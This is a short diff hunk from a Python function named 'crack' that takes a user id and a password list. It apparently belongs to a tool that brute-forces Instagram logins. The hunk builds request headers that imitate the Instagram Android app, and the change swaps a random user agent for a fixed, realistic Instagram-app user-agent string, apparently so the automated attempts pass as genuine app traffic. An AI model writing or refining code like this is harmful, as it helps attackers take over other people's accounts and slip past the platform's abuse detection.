@@ -118,7 +118,7 @@ def crack(uid, password_list, total_count):
             'x-ig-connection-type': 'MOBILE(LTE)',
             'x-ig-capabilities': '3brTv10=',
             'priority': 'u=3',
-            'user-agent': UserAgent(),
+            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-S906U1 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.124 Mobile Safari/537.36 Instagram 408.0.0.0.45 Android (35/15; 450dpi; 1080x2340; samsung; SM-S906U1; g0q; qcom; es_LA; 827194262; IABMV/1)',
             'accept-language': 'id-ID, en-US',
             'x-mid': '',
             'ig-intended-user-id': '0',
